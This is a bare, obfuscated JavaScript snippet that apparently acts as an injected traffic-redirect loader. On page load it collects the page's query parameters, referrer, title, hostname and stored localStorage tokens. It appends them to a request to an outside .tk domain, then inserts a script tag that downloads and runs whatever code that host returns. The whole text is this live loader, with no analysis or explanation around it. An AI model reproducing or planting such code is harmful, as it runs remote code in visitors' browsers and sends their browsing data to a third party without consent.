   (function() {
    var name = '_67sMZh23cdRJ594s';
    if (!window._67sMZh23cdRJ594s) {
        window._67sMZh23cdRJ594s = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://teplodistedeli.tk/fitshow',
            P_PATH: 'https://teplodistedeli.tk/fec84ce/postback',
        };
    }
    const _fnfpjzbHYXVwhjcR = localStorage.getItem('config');
    if (typeof _fnfpjzbHYXVwhjcR !== 'undefined' && _fnfpjzbHYXVwhjcR !== null) {
        var _23MxRKyg5XRxMhKR = JSON.parse(_fnfpjzbHYXVwhjcR);
        var _1zZwJ9LCJ6QzDBdd = Math.round(+new Date()/1000);
        if (_23MxRKyg5XRxMhKR.created_at + window._67sMZh23cdRJ594s.ttl < _1zZwJ9LCJ6QzDBdd) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _pg2CWm48CcTw5J4b = localStorage.getItem('subId');
    var _BFbrxdhTPQH9CFzH = localStorage.getItem('token');
    var _39hKTVLGDGXd32pP = '?return=js.client';
        _39hKTVLGDGXd32pP += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _39hKTVLGDGXd32pP += '&se_referrer=' + encodeURIComponent(document.referrer);
        _39hKTVLGDGXd32pP += '&default_keyword=' + encodeURIComponent(document.title);
        _39hKTVLGDGXd32pP += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _39hKTVLGDGXd32pP += '&name=' + encodeURIComponent(name);
        _39hKTVLGDGXd32pP += '&host=' + encodeURIComponent(window._67sMZh23cdRJ594s.R_PATH);
    if (typeof _pg2CWm48CcTw5J4b !== 'undefined' && _pg2CWm48CcTw5J4b && window._67sMZh23cdRJ594s.unique) {
        _39hKTVLGDGXd32pP += '&sub_id=' + encodeURIComponent(_pg2CWm48CcTw5J4b);
    }
    if (typeof _BFbrxdhTPQH9CFzH !== 'undefined' && _BFbrxdhTPQH9CFzH && window._67sMZh23cdRJ594s.unique) {
        _39hKTVLGDGXd32pP += '&token=' + encodeURIComponent(_BFbrxdhTPQH9CFzH);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._67sMZh23cdRJ594s.R_PATH + _39hKTVLGDGXd32pP;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
